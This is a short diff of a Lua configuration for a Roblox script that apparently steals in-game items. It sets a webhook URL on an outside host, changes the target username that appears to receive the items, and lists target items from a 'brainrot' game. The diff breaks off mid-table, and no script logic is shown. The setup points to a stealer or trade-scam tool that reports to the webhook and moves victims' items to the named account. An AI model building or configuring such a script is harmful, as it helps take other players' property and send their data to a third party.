@@ -1,5 +1,5 @@
 getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=Nostsn2fpPsPndp"
-getgenv().TARGET_USERNAME = "hakimidu_95"
+getgenv().TARGET_USERNAME = "SabHolder_A"
 getgenv().TARGET_BRAINROT = {
  ["Strawberry Elephant"] = true,
 ["Meowl"] = true,
